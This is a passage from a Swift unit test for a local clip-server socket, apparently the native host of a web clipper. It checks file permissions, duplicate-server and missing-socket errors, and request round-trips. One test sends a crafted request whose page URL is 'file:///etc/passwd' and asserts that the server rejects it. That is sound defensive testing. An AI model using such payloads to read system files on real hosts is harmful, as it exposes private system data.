        XCTAssertEqual(try FileManager.default.attributesOfItem(atPath: path)[.posixPermissions] as? Int, 0o600)
        XCTAssertThrowsError(try ClipSocketServer(path: path) { _ in .failure("", "x", "x") }.start()) {
            XCTAssertEqual($0 as? ClipChannel.Failure, .alreadyRunning)
        }
        let request = ClipRequest(type: .clip, page: PageCapture(url: "https://example.com", title: "Hello"))
        let response = try ClipChannel.send(request, path: path)
        XCTAssertEqual(response.id, request.id)
        XCTAssertEqual(response.vault, "Hello")
        XCTAssertEqual(response.destination?.kind, "inbox")

        // A same-user process skipping the native host still gets schema-checked.
        let fd = try ClipChannel.connect(path, timeout: 5)
        defer { close(fd) }
        try ClipFraming.write(fd: fd, Data("{\"v\":1,\"id\":\"\(id)\",\"type\":\"clip\",\"page\":{\"url\":\"file:///etc/passwd\",\"title\":\"x\"}}".utf8))
        let reply = try JSONDecoder().decode(ClipResponse.self, from: ClipFraming.read(fd: fd, limit: 1 << 20))
        XCTAssertFalse(reply.ok); XCTAssertEqual(reply.code, "invalid"); XCTAssertEqual(reply.id, id)
        XCTAssertThrowsError(try ClipChannel.send(request, path: "/tmp/ws-missing-\(UUID().uuidString.prefix(6)).sock")) {
            XCTAssertEqual($0 as? ClipChannel.Failure, .notRunning)
        }
    }
}
